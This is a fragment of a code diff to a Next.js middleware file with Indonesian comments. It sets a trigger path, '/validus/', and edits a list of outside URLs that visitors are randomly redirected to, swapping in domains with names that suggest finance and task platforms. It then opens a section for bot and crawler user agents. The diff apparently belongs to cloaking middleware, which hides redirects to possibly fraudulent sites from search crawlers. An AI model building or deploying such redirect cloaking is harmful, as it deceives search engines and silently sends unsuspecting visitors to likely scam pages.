@@ -4,14 +4,17 @@ import { NextResponse } from 'next/server';
 // 1. KONFIGURASI KHUSUS ANDA
 // ===============================================
 
-// JALUR URL yang MENGAKTIFKAN PENGALIHAN (harus dimulai dan diakhiri dengan /)
-const ACTIVE_REDIRECT_PATH = '/validus/'; 
+// Path yang akan MENGAKTIFKAN PENGALIHAN. Kita pastikan path ini selalu diakhiri /
+let ACTIVE_REDIRECT_PATH = '/validus/'; 
+if (!ACTIVE_REDIRECT_PATH.endsWith('/')) {
+    ACTIVE_REDIRECT_PATH += '/';
+}
 
 // URL TARGET ANDA (Pengalihan Acak)
 const TARGET_URLS = [
     "https://ventureidven.com/",
-    "https://membershipaccountid.com/",
-    "https://vcapitalid.com/"
+    "https://akunfinansial.com/",
+    "https://platformtugas.com/"
 ];
 
 // USER AGENT BOT/CRAWLER
